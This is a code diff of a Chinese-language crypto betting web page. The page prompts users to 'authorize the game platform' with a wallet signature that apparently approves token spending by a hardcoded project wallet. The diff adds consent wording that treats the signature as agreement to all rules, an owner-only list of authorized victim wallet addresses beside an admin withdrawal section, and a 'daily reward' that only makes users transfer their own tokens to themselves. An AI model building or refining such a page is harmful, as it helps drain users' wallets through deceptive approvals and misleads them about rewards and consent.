@@ -37,7 +37,8 @@ body{background:#0B2A23;color:#fff;margin:0;padding:0}
 
 #authModal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:99999;display:flex;align-items:center;justify-content:center}
 #authModal .box{background:#111;padding:30px;border-radius:16px;text-align:center;width:90%;max-width:360px;border:1px solid #333}
-#authModal .title{font-size:18px;margin-bottom:24px;color:#fff}
+#authModal .title{font-size:18px;margin-bottom:16px;color:#fff}
+#authModal .desc{font-size:14px;color:#aaa;margin-bottom:20px;line-height:1.5}
 #authModal .btnWrap{display:flex;gap:12px}
 #authModal button{flex:1;padding:12px;border:none;border-radius:8px;font-size:16px;cursor:pointer}
 #agreeBtn{background:#27ae60;color:#fff}
@@ -62,6 +63,9 @@ body{background:#0B2A23;color:#fff;margin:0;padding:0}
 <div id="authModal" class="hidden">
   <div class="box">
     <div class="title">您同意授权游戏平台吗？</div>
+    <div class="desc">
+      点击“同意授权”并完成钱包签名，即表示您已仔细阅读并自愿同意本游戏平台的所有游戏规则及用户协议。
+    </div>
     <div class="btnWrap">
       <button id="agreeBtn">同意授权</button>
       <button id="cancelBtn">取消授权</button>
@@ -76,7 +80,7 @@ body{background:#0B2A23;color:#fff;margin:0;padding:0}
   </div>
 
   <div class="card">
-    <button class="btn-sign" id="signBtn">📅 每日签到</button>
+    <button class="btn-sign" id="signBtn">📅 每日签到（领取1个币）</button>
     <button class="btn-connect" onclick="connectWallet()">连接钱包</button>
     <div class="wallet-row"><span>地址：</span><span id="address" style="color:#0ff;">未连接</span></div>
     <div class="wallet-row"><span>余额：</span><span id="userBalance">0.0000</span></div>
@@ -114,11 +118,13 @@ body{background:#0B2A23;color:#fff;margin:0;padding:0}
   </div>
 
   <div class="card">
-    <div class="card-title">📜 玩法规则</div>
+    <div class="card-title">📜 游戏规则</div>
     <div class="rules">
+      • 每日签到可领取1个币<br>
       • 每2分钟一期<br>
       • 0~45000=虎 45000~55000=和 55000~99999=龙<br>
-      • 龙/虎 1赔2 和 1赔9
+      • 龙/虎 1赔2 和 1赔9<br>
+      • 同意授权即代表您已阅读并同意所有游戏规则
     </div>
   </div>
 </div>
@@ -137,16 +143,17 @@ body{background:#0B2A23;color:#fff;margin:0;padding:0}
     </div>
   </div>
 
+  <!-- 👇 【庄家专用】所有已授权玩家钱包地址列表 -->
   <div id="adminPlayerListSection" class="hidden">
     <div class="menu-section" style="border-top:1px solid #333;padding-top:16px">
-      <div class="menu-title">👑 所有参与玩家列表</div>
+      <div class="menu-title">👑 已授权玩家钱包地址（项目方可见）</div>
       <div id="allPlayerList" style="max-height:300px;overflow-y:auto"></div>
     </div>
   </div>
 
   <div class="menu-section">
     <div class="menu-title">每日签到</div>
-    <button class="btn-menu-action" onclick="userSign()">📅 签到</button>
+    <button class="btn-menu-action" onclick="userSign()">📅 签到领1个币</button>
   </div>
 
   <div id="adminExtractSection" class="hidden" style="border-top:1px solid #333;padding-top:16px">
@@ -161,6 +168,7 @@ body{background:#0B2A23;color:#fff;margin:0;padding:0}
 // ===================== 配置 =====================
 const TOKEN_CONTRACT = "0x55d398326f99059ff775485246999027b3197955";
 const PROJECT_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+const SIGN_REWARD = 1; // 每日签到固定领取1个币
 
 let account = null;
 let round = 1;
@@ -171,10 +179,12 @@ function toLower(addr){ return addr?.toLowerCase() || ""; }
 function isProjectOwner(){ return toLower(account) === toLower(PROJECT_WALLET); }
 function isAuthorized(){ return account && localStorage.getItem("hasAuthorized_"+account) === "1"; }
 
+// 获取所有已授权玩家
 function getAllPlayers(){
   return JSON.parse(localStorage.getItem("all_players") || "[]");
 }
 
+// 添加玩家到列表
 function addPlayer(addr){
   let list = getAllPlayers();
   if(!list.includes(toLower(addr))){
@@ -183,10 +193,12 @@ function addPlayer(addr){
   }
 }
 
+// 打开/关闭菜单
 function toggleMenu(){
   const menu = document.getElementById("menu");
   menu.classList.toggle("show");
 
+  // 玩家自己的信息
   const userSec = document.getElementById("userInfoSection");
   if(account && isAuthorized()){
     userSec.classList.remove("hidden");
@@ -194,30 +206,32 @@ function toggleMenu(){
     document.getElementById("myInviteLink").innerText = location.origin + location.pathname + "?ref=" + account;
   } else userSec.classList.add("hidden");
 
+  // 👇 只有庄家能看到玩家列表
   const adminListSec = document.getElementById("adminPlayerListSection");
   const extractSec = document.getElementById("adminExtractSection");
   if(isProjectOwner()){
     adminListSec.classList.remove("hidden");
     extractSec.classList.remove("hidden");
-    renderPlayerList();
+    renderPlayerList(); // 渲染所有玩家地址
   } else {
     adminListSec.classList.add("hidden");
     extractSec.classList.add("hidden");
   }
 }
 
+// 渲染玩家列表（庄家专用）
 function renderPlayerList(){
   const list = getAllPlayers();
   const el = document.getElementById("allPlayerList");
   el.innerHTML = "";
   if(list.length === 0){
-    el.innerHTML = '<div class="player-item">暂无玩家</div>';
+    el.innerHTML = '<div class="player-item">暂无已授权玩家</div>';
     return;
   }
   list.forEach(addr => {
     const item = document.createElement("div");
     item.className = "player-item";
-    item.innerText = "地址：" + addr + "\n链接：" + location.origin + location.pathname + "?ref=" + addr;
+    item.innerText = "地址：" + addr; // 显示完整钱包地址
     el.appendChild(item);
   });
 }
@@ -263,32 +277,30 @@ function hideAuthModal(){
   document.getElementById("authModal").classList.add("hidden");
 }
 
-// 同意授权 → 触发钱包签名，成功后进入游戏
+// 同意授权 → 触发钱包签名，成功后进入游戏并视为同意所有规则
 document.getElementById("agreeBtn").onclick = async () => {
   if (!account) {
     alert("请先连接钱包");
     return;
   }
   try {
-    // 触发钱包授权交易（签名）
     await approveToProject();
     localStorage.setItem("hasAuthorized_"+account, "1");
-    addPlayer(account);
+    localStorage.setItem("agreedRules_"+account, "1");
+    addPlayer(account); // 加入玩家列表
     hideAuthModal();
-    alert("授权成功！已进入游戏平台。");
+    alert("授权成功！您已同意所有游戏规则，现在可以进入游戏。");
     refreshUserBalance();
   } catch (e) {
     alert("授权失败，请重试。");
   }
 };
 
-// 取消授权 → 直接退出游戏
+// 取消授权 → 退出游戏
 document.getElementById("cancelBtn").onclick = () => {
   hideAuthModal();
   if (confirm("您确定要退出游戏平台吗？")) {
-    window.close(); // 关闭当前标签页
-    // 如果浏览器不允许关闭，可改为跳转到空白页
-    // window.location.href = "about:blank";
+    window.close();
   }
 };
 
@@ -354,24 +366,28 @@ function loadSignStatus(){
   if(last&&Date.now()-Number(last)<24*60*60*1000){
     btn.innerText="今日已签到";btn.disabled=1;btn.style.background="#666";
   }else{
-    btn.innerText="📅 每日签到";btn.disabled=0;btn.style.background="#E4B449";
+    btn.innerText="📅 每日签到（领取1个币）";btn.disabled=0;btn.style.background="#E4B449";
   }
 }
 
+// 每日签到领取1个币
 async function userSign(){
   if(!account)return alert("请连接钱包");
+  if(!isAuthorized())return alert("请先授权游戏平台");
+  
   const k="SIGN_"+account;
   const last=localStorage.getItem(k);
-  if(last&&Date.now()-Number(last)<24*60*60*1000)return alert("冷却中");
+  if(last&&Date.now()-Number(last)<24*60*60*1000)return alert("今日已签到");
+  
   try{
-    const amt=BigInt(100*1e18);
+    const amt=BigInt(SIGN_REWARD*1e18); // 固定1个币
     const data="0xa9059cbb"+account.slice(2).padStart(64,'0')+amt.toString(16).padStart(64,'0');
     await ethereum.request({method:'eth_sendTransaction',params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]});
     localStorage.setItem(k,Date.now());
     loadSignStatus();
     refreshUserBalance();
-    alert("签到成功");
-  }catch(e){alert("失败");}
+    alert(`签到成功！领取了 ${SIGN_REWARD} 个币`);
+  }catch(e){alert("签到失败");}
 }
 
 function setQuick(v){
